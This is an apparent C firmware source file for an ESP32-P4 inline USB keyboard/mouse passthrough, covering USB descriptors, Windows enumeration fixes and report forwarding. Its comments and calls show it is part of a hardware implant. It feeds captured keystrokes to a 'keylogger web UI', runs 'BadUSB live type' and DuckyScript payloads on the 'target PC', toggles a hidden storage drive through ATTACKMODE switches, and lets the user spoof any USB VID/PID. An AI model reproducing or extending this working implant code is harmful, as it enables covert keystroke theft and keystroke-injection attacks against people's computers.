// TinyUSB device side + entry point. Presents an HID composite (keyboard+mouse)
// to the PC on the FS OTG port (the "core" Type-C / U4-Slave). Reads reports
// from the bridge queue that hid_host_task.c fills with keystrokes coming in
// from the real keyboard on the HS port.
//
// Windows-specific fixes:
// - Microsoft OS 2.0 descriptors (BOS + registry property). Deliberately NO
//   "WINUSB" compatible-ID override: that would steal the interface from the
//   HID class driver and break the keyboard.
// - Custom PID 0x4B44 + bumped bcdDevice in sdkconfig.defaults. The default
//   esp_tinyusb PID 0x4004 is shared by many Espressif HID examples; Windows
//   caches drivers per VID:PID(+serial), so a stale cache entry for
//   303A:4004 keeps Windows from re-enumerating the device. A fresh PID makes
//   Windows bind it as a brand-new device.
// - Chip-unique serial string so a second board never collides with this one.
// - 1ms polling retained: the fastest legal Full-Speed interval and fully
//   Windows-legal. 4ms would only add keystroke latency.
// - 250ms settle window after mount + an explicit "all keys released" flush
//   (see forward_task), so a key-release swallowed by the settle window or a
//   host-side hub reset can never leave Windows with a stuck key/modifier.

#include <string.h>
#include <stdint.h>
#include "esp_log.h"
#include "esp_err.h"
#include "esp_mac.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "tinyusb.h"
#include "class/hid/hid_device.h"
#include "tusb.h"

#include "nvs_flash.h"
#include "nvs.h"

#include "hid_bridge.h"
#include "c6_uart.h"
#include "led.h"
#include "live_type.h"
#include "sdcard.h"
#include "msc_storage.h"

// Runtime USB PHY selector — swaps FS_PHY1↔FS_PHY2 assignments.
// After swap: OTG_FS drives GPIO24/25 (the core Type-C on this board).
// USJ (COM34) is gone until next reset with BOOT held (ROM ignores this reg).
#define LP_SYSTEM_USB_CTRL_REG   0x50110100u
#define BIT_SW_HW_USB_PHY_SEL    (1u << 0)   // 1 = use SW override below
#define BIT_SW_USB_PHY_SEL       (1u << 1)   // 1 = swap PHY assignments

static void usb_phy_swap_to_otgfs_on_core_typec(void)
{
    volatile uint32_t *reg = (volatile uint32_t *)LP_SYSTEM_USB_CTRL_REG;
    *reg |= BIT_SW_HW_USB_PHY_SEL | BIT_SW_USB_PHY_SEL;
}

static const char *TAG = "hid_dev";

// Each HID function gets its OWN interface (kbd on 0, mouse on 1), so there
// is only ever one report per interface — a report-ID prefix is not needed
// and is in fact WRONG for a Boot-subclass interface. TUD_HID_DESCRIPTOR
// auto-sets bInterfaceSubClass = HID_SUBCLASS_BOOT (1) whenever the boot
// protocol arg is non-zero (see TinyUSB usbd.h TUD_HID_DESCRIPTOR macro).
// Windows' boot-HID driver expects 8-byte keyboard reports and 3-byte mouse
// reports with NO leading report ID. Prepending one caused Windows to drop
// or misinterpret every report — the "keys arrive in ESP but never reach
// the PC" symptom.
// Report ID 0 means "no ID byte on the wire" in TinyUSB's send helpers.
enum { REPORT_ID_KEYBOARD = 0, REPORT_ID_MOUSE = 0 };

// Keyboard boot report descriptor (interface 0) — no REPORT_ID.
static const uint8_t hid_keyboard_report_desc[] = {
    TUD_HID_REPORT_DESC_KEYBOARD()
};

// Mouse boot report descriptor (interface 1) — no REPORT_ID.
static const uint8_t hid_mouse_report_desc[] = {
    TUD_HID_REPORT_DESC_MOUSE()
};

// Serial string is chip-unique (filled from eFuse MAC in app_main) so two
// boards with the same custom PID never present the same identity to Windows.
static char serial_str[16];

static const char *string_desc[] = {
    (const char[]){0x09, 0x04},   // 0: English (US)
    "Spotpear",                   // 1: Manufacturer
    "ESP32-P4 HID Passthrough",   // 2: Product
    serial_str,                   // 3: Serial
    "HID Keyboard",               // 4: HID keyboard interface
    "HID Mouse"                   // 5: HID mouse interface
};

// ---------------------------------------------------------------------------
// Microsoft OS 2.0 descriptors
// ---------------------------------------------------------------------------
// Only the Registry Property form is used (DeviceInterfaceGUIDs). No WINUSB
// compatible-ID override is declared — that would make Windows bind WinUSB
// instead of the HID class driver and break the keyboard. Linux/Android never
// issue the vendor control request, so they are unaffected by this block.
#define VENDOR_REQUEST_MICROSOFT 1
#define MS_OS_20_DESC_LEN        0x9E  // full table length (layout below)

#define BOS_TOTAL_LEN (TUD_BOS_DESC_LEN + TUD_BOS_MICROSOFT_OS_DESC_LEN)

static const uint8_t desc_bos[] = {
    // total length, number of device capabilities
    TUD_BOS_DESCRIPTOR(BOS_TOTAL_LEN, 1),
    // Microsoft OS 2.0 platform capability
    TUD_BOS_MS_OS_20_DESCRIPTOR(MS_OS_20_DESC_LEN, VENDOR_REQUEST_MICROSOFT),
};

static const uint8_t desc_ms_os_20[] = {
    // Set header: length, type, windows version, total length
    U16_TO_U8S_LE(0x000A), U16_TO_U8S_LE(MS_OS_20_SET_HEADER_DESCRIPTOR),
    U32_TO_U8S_LE(0x06030000), U16_TO_U8S_LE(MS_OS_20_DESC_LEN),

    // Configuration subset: length, type, config value, reserved, subset length
    U16_TO_U8S_LE(0x0008), U16_TO_U8S_LE(MS_OS_20_SUBSET_HEADER_CONFIGURATION),
    0x00, 0x00, U16_TO_U8S_LE(0x0094),

    // Function subset for interface 0: length, type, first iface, reserved, subset len
    U16_TO_U8S_LE(0x0008), U16_TO_U8S_LE(MS_OS_20_SUBSET_HEADER_FUNCTION),
    0x00, 0x00, U16_TO_U8S_LE(0x008C),

    // Registry property: length, type
    U16_TO_U8S_LE(0x0084), U16_TO_U8S_LE(MS_OS_20_FEATURE_REG_PROPERTY),
    // REG_MULTI_SZ, name "DeviceInterfaceGUIDs\0" as UTF-16 (42 bytes)
    U16_TO_U8S_LE(0x0007), U16_TO_U8S_LE(0x002A),
    'D', 0x00, 'e', 0x00, 'v', 0x00, 'i', 0x00, 'c', 0x00, 'e', 0x00,
    'I', 0x00, 'n', 0x00, 't', 0x00, 'e', 0x00, 'r', 0x00, 'f', 0x00,
    'a', 0x00, 'c', 0x00, 'e', 0x00, 'G', 0x00, 'U', 0x00, 'I', 0x00,
    'D', 0x00, 's', 0x00, 0x00, 0x00,
    // Property data: "{6F519A81-2F3C-4C6A-9E8B-2A4C9A12730A}\0\0" UTF-16 (80 bytes)
    U16_TO_U8S_LE(0x0050),
    '{', 0x00, '6', 0x00, 'F', 0x00, '5', 0x00, '1', 0x00, '9', 0x00,
    'A', 0x00, '8', 0x00, '1', 0x00, '-', 0x00, '2', 0x00, 'F', 0x00,
    '3', 0x00, 'C', 0x00, '-', 0x00, '4', 0x00, 'C', 0x00, '6', 0x00,
    'A', 0x00, '-', 0x00, '9', 0x00, 'E', 0x00, '8', 0x00, 'B', 0x00,
    '-', 0x00, '2', 0x00, 'A', 0x00, '4', 0x00, 'C', 0x00, '9', 0x00,
    'A', 0x00, '1', 0x00, '2', 0x00, '7', 0x00, '3', 0x00, '0', 0x00,
    'A', 0x00, '}', 0x00, 0x00, 0x00, 0x00, 0x00,
};

_Static_assert(sizeof(desc_ms_os_20) == MS_OS_20_DESC_LEN, "MS OS 2.0 table size mismatch");

// ---------------------------------------------------------------------------
// Custom device descriptor
// ---------------------------------------------------------------------------
// Windows binds any multi-interface device via USB\COMPOSITE → usbccgp.
// usbccgp REQUIRES IADs to know which interfaces belong to which function;
// without them it fails with 0xC0000001 (Code 10).
// Setting bDeviceClass=0xEF / SubClass=0x02 / Protocol=0x01 (IAD-capable)
// lets usbccgp read the IADs in the configuration descriptor and correctly
// create one HID child device per interface.
// bcdDevice bumped every time the HID descriptor changes shape (report-ID
// present/absent, endpoint layout) so Windows discards its cached parse and
// re-evaluates the descriptor fresh on the next plug-in.
//   0x0201 -> original single-interface layout with report IDs 1+2
//   0x0202 -> composite kbd+mouse WITH per-interface report ID 1
//   0x0203 -> composite kbd+mouse WITHOUT report IDs (current — boot subclass
//             requires 8-byte / 3-byte reports with no prefix)
// Mutable — VID/PID can be overridden from NVS at boot (set via
// SDIO reg 48..51 by the C6's /api/save-usb endpoint) so the user
// can spoof any USB identity from the web UI without reflashing.
static tusb_desc_device_t device_desc = {
    .bLength            = sizeof(tusb_desc_device_t),
    .bDescriptorType    = TUSB_DESC_DEVICE,
    .bcdUSB             = 0x0200,
    // IAD-capable composite: bDeviceClass=0xEF, SubClass=0x02, Protocol=0x01
    // Required by USB spec when IADs are present in the configuration.
    .bDeviceClass       = 0xEF,
    .bDeviceSubClass    = 0x02,
    .bDeviceProtocol    = 0x01,
    .bMaxPacketSize0    = 64,
    .idVendor           = 0x303A,           // Espressif VID
    .idProduct          = 0x4B44,           // custom PID "KD" (keyboard)
    .bcdDevice          = 0x0203,           // bumped every time the HID report layout changes
    .iManufacturer      = 0x01,
    .iProduct           = 0x02,
    .iSerialNumber      = 0x03,
    .bNumConfigurations = 0x01,
};

// IAD length is 8 bytes (USB 2.0 spec §9.6.4)
#define TUD_IAD_DESC_LEN  8
// One IAD covers exactly one interface here (keyboard or mouse).
// Class=0x03 (HID), SubClass/Protocol=0 (no boot override at the IAD level —
// the HID interface descriptor already sets the subclass/protocol).
#define TUD_IAD_DESCRIPTOR(_first_itf, _itf_count, _class, _subclass, _protocol, _stridx) \
    TUD_IAD_DESC_LEN, TUSB_DESC_INTERFACE_ASSOCIATION,                               \
    _first_itf, _itf_count, _class, _subclass, _protocol, _stridx

// Two configuration variants, swapped LIVE (no reboot):
//
//   HID-only : 2 interfaces (kbd + mouse). NO MSC interface, so the host
//              never creates a drive letter. Default (ATTACKMODE HID).
//   Full     : 3 interfaces (kbd + mouse + MSC). ATTACKMODE HID STORAGE.
//
// esp_tinyusb stores ONE descriptor pointer at install time and hands it
// back from tud_descriptor_configuration_cb. We give it a single mutable
// buffer (s_cfg_desc) sized for the FULL variant and rewrite its bytes when
// storage is toggled: the host reads only wTotalLength bytes, so writing the
// HID-only header (2 interfaces, shorter length) hides MSC even though the
// buffer is physically longer. Toggling then does tud_disconnect() → rewrite
// → tud_connect(), so the host re-enumerates with the new interface set
// WITHOUT a chip reboot — a reboot mid-payload would drop the SDIO link and
// kill the running DuckyScript (that was the ATTACKMODE-toggle crash).
#define CFG_TOTAL_LEN_FULL (TUD_CONFIG_DESC_LEN + \
                            TUD_IAD_DESC_LEN + TUD_HID_DESC_LEN + \
                            TUD_IAD_DESC_LEN + TUD_HID_DESC_LEN + \
                            TUD_MSC_DESC_LEN)
#define CFG_TOTAL_LEN_HID  (TUD_CONFIG_DESC_LEN + \
                            TUD_IAD_DESC_LEN + TUD_HID_DESC_LEN + \
                            TUD_IAD_DESC_LEN + TUD_HID_DESC_LEN)

// Shared HID block (keyboard iface 0 + mouse iface 1). Same bytes in both
// variants — only the config header's interface count/length and the
// trailing MSC interface differ.
#define HID_IFACE_BLOCK \
    TUD_IAD_DESCRIPTOR(0, 1, TUSB_CLASS_HID, HID_SUBCLASS_BOOT, HID_ITF_PROTOCOL_KEYBOARD, 0), \
    TUD_HID_DESCRIPTOR(0, 0, HID_ITF_PROTOCOL_KEYBOARD, sizeof(hid_keyboard_report_desc), 0x81, 16, 1), \
    TUD_IAD_DESCRIPTOR(1, 1, TUSB_CLASS_HID, HID_SUBCLASS_BOOT, HID_ITF_PROTOCOL_MOUSE, 0), \
    TUD_HID_DESCRIPTOR(1, 0, HID_ITF_PROTOCOL_MOUSE, sizeof(hid_mouse_report_desc), 0x82, 16, 1)

// Const templates memcpy'd into the mutable active buffer.
static const uint8_t configuration_desc_full[] = {
    TUD_CONFIG_DESCRIPTOR(1, 3, 0, CFG_TOTAL_LEN_FULL, TUSB_DESC_CONFIG_ATT_REMOTE_WAKEUP, 250),
    HID_IFACE_BLOCK,
    TUD_MSC_DESCRIPTOR(2, 0, 0x03, 0x83, 64),
};
static const uint8_t configuration_desc_hidonly[] = {
    TUD_CONFIG_DESCRIPTOR(1, 2, 0, CFG_TOTAL_LEN_HID, TUSB_DESC_CONFIG_ATT_REMOTE_WAKEUP, 250),
    HID_IFACE_BLOCK,
};

// The live buffer esp_tinyusb keeps a pointer to. Sized for the full variant;
// HID-only just writes fewer meaningful bytes (host honours wTotalLength).
static uint8_t s_cfg_desc[sizeof(configuration_desc_full)];
static bool    s_storage_visible = false;   // what s_cfg_desc currently reflects

// Fill s_cfg_desc with the requested variant. Pointer/identity is stable so
// the pointer esp_tinyusb holds stays valid across swaps.
static void build_config_desc(bool with_msc) {
    if (with_msc) memcpy(s_cfg_desc, configuration_desc_full,    sizeof(configuration_desc_full));
    else          memcpy(s_cfg_desc, configuration_desc_hidonly, sizeof(configuration_desc_hidonly));
    s_storage_visible = with_msc;
}

// Live toggle of the MSC volume without a chip reboot. Called from the
// ATTACKMODE STORAGE handler (via live_type.c). Re-enumerates so the host
// adds/removes the drive letter; the running DuckyScript keeps going.
void usb_apply_storage_visibility(bool on) {
    if (on == s_storage_visible) return;   // no change → nothing to do
    ESP_LOGI(TAG, "USB storage %s — live re-enumerating (no reboot)", on ? "on" : "off");
    tud_disconnect();
    vTaskDelay(pdMS_TO_TICKS(120));      // let the host notice the unplug
    build_config_desc(on);
    tud_connect();
}

// TinyUSB required callbacks
uint8_t const *tud_hid_descriptor_report_cb(uint8_t instance) {
    // instance 0 = keyboard interface, instance 1 = mouse interface
    if (instance == 0) return hid_keyboard_report_desc;
    return hid_mouse_report_desc;
}
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type,
                               uint8_t *buffer, uint16_t reqlen) {
    (void)instance; (void)report_id; (void)report_type; (void)buffer; (void)reqlen;
    return 0;
}
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type,
                           uint8_t const *buffer, uint16_t bufsize) {
    // Only keyboard interface (instance 0) receives LED output reports.
    // With no report ID declared, TinyUSB calls this with report_id = 0 and
    // buffer is the raw 1-byte LED bitmap.
    if (instance != 0) return;
    if (report_type == HID_REPORT_TYPE_OUTPUT && report_id == 0 && bufsize >= 1) {
        hid_host_set_kbd_leds(buffer[0]);
    }
}

// BOS descriptor: lets Windows 8.1+ ask for the Microsoft OS 2.0 table below.
uint8_t const *tud_descriptor_bos_cb(void) {
    return desc_bos;
}

// Answers the Microsoft OS 2.0 descriptor query (bRequest=1, wIndex=7).
bool tud_vendor_control_xfer_cb(uint8_t rhport, uint8_t stage,
                                tusb_control_request_t const *request) {
    if (stage != CONTROL_STAGE_SETUP) return true;
    if (request->bmRequestType_bit.type == TUSB_REQ_TYPE_VENDOR &&
        request->bRequest == VENDOR_REQUEST_MICROSOFT &&
        request->wIndex == 7) {
        return tud_control_xfer(rhport, request,
                                (void *)(uintptr_t)desc_ms_os_20, MS_OS_20_DESC_LEN);
    }
    // Stall anything else we don't own.
    return false;
}

// Boot keyboard input report layout: modifier(1) + reserved(1) + keycode[6]
// Boot mouse input report layout:    buttons(1) + dx(int8) + dy(int8) [+ wheel]

// Send every report in order — for keyboards, intermediate states matter
// (Shift down + Shift+Tab + Tab up must ALL land). Retry the pending report
// until it goes out; TinyUSB's tud_hid_ready flips true on every USB frame
// (1 ms) so worst case we're re-trying a few times.
//
// If the PC isn't mounted (boot, suspend, cable not fully seated) we DROP
// buffered reports rather than hold them — otherwise the whole backlog gets
// dumped into whichever window has focus the moment the PC comes back,
// which the user saw as "usb HID automatic spam" after enumeration.
//
// Two layers make sure Windows can never keep a stuck key/modifier, which is
// the "keyboard goes crazy" symptom:
//  1. publish_report() on the host side never loses keyboard traffic: if the
//     queue is full it evicts the OLDEST report instead of dropping the newest
//     (a dropped key-UP is what leaves the modifier stuck).
//  2. When the PC re-enumerates, we drop reports for a short 250 ms settle,
//     then send an explicit "all keys released" keyboard report before
//     forwarding live input. Also handled on keyboard re-connect via
//     HID_REP_KIND_KEYBOARD_RESET from hid_host_task.c.
// CONFIG_FREERTOS_HZ = 100 in this build, so pdMS_TO_TICKS(1) == 0.
// vTaskDelay(0) only yields to same-or-higher-priority tasks, so a prio-10
// forward_task on core 1 that spins on pdMS_TO_TICKS(1) BLOCKS TinyUSB
// (prio 5, also core 1) forever — the endpoint stays busy, kbd_ready stays
// false, no key ever gets sent to Windows. Any retry-yield here must be at
// least one full tick (10 ms at 100 Hz).
#define FWD_RETRY_YIELD  pdMS_TO_TICKS(10)

static void forward_task(void *arg) {
    hid_bridge_msg_t m;
    bool have_pending = false;
    bool was_mounted = false;
    bool reset_pending = false;
    TickType_t mount_grace_end = 0;
    while (1) {
        bool now_mounted = tud_mounted();
        // Detect the unmounted -> mounted edge. Open a short settle window
        // (we DROP incoming reports while Windows binds our HID collection),
        // then flush an all-released keyboard report to clear any phantom
        // held keys before live input resumes.
        if (now_mounted && !was_mounted) {
            // Give Windows enough time to bind our HID collection before we
            // start forwarding reports (otherwise a report that lands mid-
            // bind is dropped by usbhid.sys). 100 ms is plenty on Win10/11
            // — the previous 250 ms was pure conservatism and cost the user
            // any keystroke that landed in that window.
            mount_grace_end = xTaskGetTickCount() + pdMS_TO_TICKS(100);
            reset_pending = true;
        }
        was_mounted = now_mounted;

        if (!have_pending) {
            if (xQueueReceive(g_hid_bridge_q, &m, portMAX_DELAY) != pdTRUE) continue;
            have_pending = true;
        }
        if (!now_mounted || xTaskGetTickCount() < mount_grace_end) {
            // Drop the pending one and drain the queue so we don't hold onto
            // pre-mount / grace-window keystrokes.
            have_pending = false;
            hid_bridge_msg_t drop;
            while (xQueueReceive(g_hid_bridge_q, &drop, 0) == pdTRUE) { /* discard */ }
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }
        // Check HID ready per-interface (instance 0 = keyboard, 1 = mouse)
        bool kbd_ready = tud_hid_n_ready(0);
        bool mouse_ready = tud_hid_n_ready(1);

        // Settle window over: tell the PC no key is held, then forward live
        // input. Without this, a key-release that got dropped during the
        // window leaves Windows holding the key/modifier forever.
        if (reset_pending) {
            static const uint8_t all_zero[6] = {0};
            if (kbd_ready && tud_hid_n_keyboard_report(0, REPORT_ID_KEYBOARD, 0, all_zero)) {
                reset_pending = false;
            } else {
                vTaskDelay(FWD_RETRY_YIELD);
                continue;
            }
        }

        bool sent = false;
        if (m.kind == HID_REP_KIND_KEYBOARD && m.len >= 8) {
            if (!kbd_ready) { vTaskDelay(FWD_RETRY_YIELD); continue; }
            uint8_t mod = m.data[0];
            uint8_t kcs[6]; memcpy(kcs, &m.data[2], 6);
            sent = tud_hid_n_keyboard_report(0, REPORT_ID_KEYBOARD, mod, kcs);
        } else if (m.kind == HID_REP_KIND_KEYBOARD_RESET) {
            if (!kbd_ready) { vTaskDelay(FWD_RETRY_YIELD); continue; }
            static const uint8_t all_zero[6] = {0};
            sent = tud_hid_n_keyboard_report(0, REPORT_ID_KEYBOARD, 0, all_zero);
        } else if (m.kind == HID_REP_KIND_MOUSE && m.len >= 3) {
            if (!mouse_ready) { vTaskDelay(FWD_RETRY_YIELD); continue; }
            uint8_t buttons = m.data[0];
            int8_t dx = (int8_t)m.data[1];
            int8_t dy = (int8_t)m.data[2];
            // Boot mouse report is 3 bytes; some report a 4th byte (wheel).
            // Forward it when present so scroll wheels work end-to-end.
            int8_t wheel = (m.len >= 4) ? (int8_t)m.data[3] : 0;
            sent = tud_hid_n_mouse_report(1, REPORT_ID_MOUSE, buttons, dx, dy, wheel, 0);
        } else {
            sent = true;   // unknown kind, drop
        }
        if (sent) have_pending = false;
        else      vTaskDelay(FWD_RETRY_YIELD);
    }
}

// Mount watchdog for the PC (TinyUSB device side). Whether Windows has bound
// our HID composite was invisible — the C6 UI only knew about the keyboard and
// mouse on the HOST side. Emit EVT PC_CONNECT / PC_DISCONNECT on mount edges so
// the web UI shows a "PC" pill: green = Windows sees the keyboard, red/warn =
// the device isn't mounted and keystrokes are being dropped by design.
static void pc_watch_task(void *arg) {
    (void)arg;
    bool was = false;
    bool announced_ready = false;   // did we push the "current" state after SDIO came up?
    while (1) {
        bool now = tud_mounted();
        bool link = c6_uart_link_ready();
        if (now != was) {
            was = now;
            c6_uart_send_evt(now ? "PC_CONNECT" : "PC_DISCONNECT");
            ESP_LOGI(TAG, "PC %s", now ? "mounted" : "unmounted");
        }
        // First time SDIO becomes ready after boot: re-emit the current PC
        // state so an early mount edge that fired before the link was up
        // (and got silently dropped by tx_line) is caught. Without this the
        // web UI's "PC" pill stays permanently at DISCONNECT on cold boot.
        if (link && !announced_ready) {
            announced_ready = true;
            c6_uart_send_evt(now ? "PC_CONNECT" : "PC_DISCONNECT");
        }
        vTaskDelay(pdMS_TO_TICKS(300));
    }
}

// Load any user-persisted USB identity (VID/PID/rev) from NVS BEFORE
// TinyUSB reads the descriptor. Writes come from the C6 web UI's
// /api/save-usb endpoint via SDIO reg 48..52 (see live_type.c poller).
// Legacy behaviour: if the NVS keys are absent, the compiled-in
// defaults win.
static void load_usb_identity(void) {
    nvs_handle_t h;
    if (nvs_open("usb", NVS_READONLY, &h) != ESP_OK) return;
    uint16_t v = 0;
    if (nvs_get_u16(h, "vid", &v) == ESP_OK && v != 0) device_desc.idVendor  = v;
    if (nvs_get_u16(h, "pid", &v) == ESP_OK && v != 0) device_desc.idProduct = v;
    if (nvs_get_u16(h, "rev", &v) == ESP_OK && v != 0) device_desc.bcdDevice = v;
    nvs_close(h);
    ESP_LOGI("usb_id", "identity: VID=%04X PID=%04X rev=%04X",
             device_desc.idVendor, device_desc.idProduct, device_desc.bcdDevice);
}

void app_main(void) {
    ESP_LOGI(TAG, "Starting HID passthrough on ESP32-P4");

    // NVS holds the persisted USB identity (VID/PID/rev) — must be
    // available before load_usb_identity() touches it.
    esp_err_t nvs_err = nvs_flash_init();
    if (nvs_err == ESP_ERR_NVS_NO_FREE_PAGES || nvs_err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase(); nvs_flash_init();
    }
    load_usb_identity();

    // Mount the MSC wear-leveled partition BEFORE tinyusb_driver_install
    // so the tud_msc_* callbacks (linked in from msc_storage.c) have a
    // valid handle when the host first probes the drive.
    (void)msc_storage_init();

    // Status LED first so we get a green idle blink as boot progresses.
    led_init();

    // Bring up the SDIO link to the C6 keylogger web UI. Runs in a background
    // task so app_main isn't blocked if SDIO enum fails.
    c6_uart_init();

    // Short pause so any early ESP_LOG lands on USJ before the PHY swap.
    // Removed the long diagnostic window — SDIO is proven working now.
    vTaskDelay(pdMS_TO_TICKS(300));

    // Runtime PHY swap: after this line, GPIO24/25 (the core Type-C on the MINI)
    // carries the OTG-FS controller instead of USB-Serial-JTAG. USJ / COM34 dies.
    usb_phy_swap_to_otgfs_on_core_typec();

    // Unique-per-chip serial keeps this device's identity stable across
    // re-flashes while never colliding with a second board on the same PC.
    // The factory MAC is unique per chip; fold its first 4 bytes into the id.
    uint8_t mac[6] = { 0 };
    if (esp_efuse_mac_get_default(mac) != ESP_OK) { /* keep all-zero -> still stable */ }
    uint32_t id = ((uint32_t)mac[0] << 24) | ((uint32_t)mac[1] << 16)
                | ((uint32_t)mac[2] << 8)  |  (uint32_t)mac[3];
    snprintf(serial_str, sizeof(serial_str), "P4HID-%08X", (unsigned int)id);

    // 512 slots so a brief TinyUSB stall (PC suspend / poll gap) can't overflow
    // and start dropping input reports from the physical keyboard. On the rare
    // full queue, publish_report() still guarantees the newest keyboard report
    // (which may be a key release) is never dropped.
    g_hid_bridge_q = xQueueCreate(512, sizeof(hid_bridge_msg_t));
    configASSERT(g_hid_bridge_q);

    const tinyusb_config_t tcfg = {
        // Custom descriptor: bDeviceClass=0xEF/0x02/0x01 (IAD-capable composite)
        // + bcdDevice=0x0202 to bust Windows' stale driver cache for 0x0201.
        // Without this esp_tinyusb falls back to its own default descriptor
        // (bDeviceClass=0x00) and the IADs in configuration_desc are ignored.
        .device_descriptor = &device_desc,
        .string_descriptor = string_desc,
        .string_descriptor_count = sizeof(string_desc) / sizeof(string_desc[0]),
        .external_phy = false,
        // Expose the MSC volume ONLY when ATTACKMODE STORAGE is persisted on;
        // otherwise enumerate HID-only so no drive letter ever appears. The
        // buffer is mutable so a later ATTACKMODE toggle can swap it live.
        .configuration_descriptor = s_cfg_desc,
    };
    build_config_desc(msc_storage_enabled());
    ESP_LOGI(TAG, "USB descriptor: %s",
             msc_storage_enabled() ? "HID + MSC (storage on)" : "HID-only (storage off)");
    ESP_ERROR_CHECK(tinyusb_driver_install(&tcfg));
    ESP_LOGI(TAG, "TinyUSB HID device up (FS port -> PC)");
    c6_uart_send_evt("USB_UP");

    xTaskCreatePinnedToCore(pc_watch_task, "pc_watch", 2048, NULL, 6, NULL, 0);

    // Priority 10 so the forward task preempts everything else on core 1
    // and hands each report to TinyUSB the instant it lands in the queue.
    xTaskCreatePinnedToCore(forward_task, "hid_fwd", 4096, NULL, 10, NULL, 1);

    hid_host_task_start();
    // BadUSB "live type" watcher: polls SDIO reg 44 for bytes the C6 web
    // UI wants us to type on the target PC.
    live_type_start();
    // Best-effort MicroSD mount on SLOT_0 (SLOT_1 is the SDIO link to C6).
    // Non-fatal — the rest of the firmware runs fine without a card.
    (void)sdcard_mount();

    // Diagnostic heartbeat: prints TinyUSB mount + HID readiness every 3 s.
    // Watch this on the USB-Serial-JTAG (core Type-C, COM34). "mounted=1" means
    // the PC has enumerated our HID composite on whichever Type-C is FS-OTG.
    uint32_t tick = 0;
    while (1) {
        ESP_LOGI(TAG, "heartbeat t=%us  tud_mounted=%d  tud_ready=%d",
                 (unsigned)tick, tud_mounted() ? 1 : 0, tud_ready() ? 1 : 0);
        vTaskDelay(pdMS_TO_TICKS(3000));
        tick += 3;
    }
}
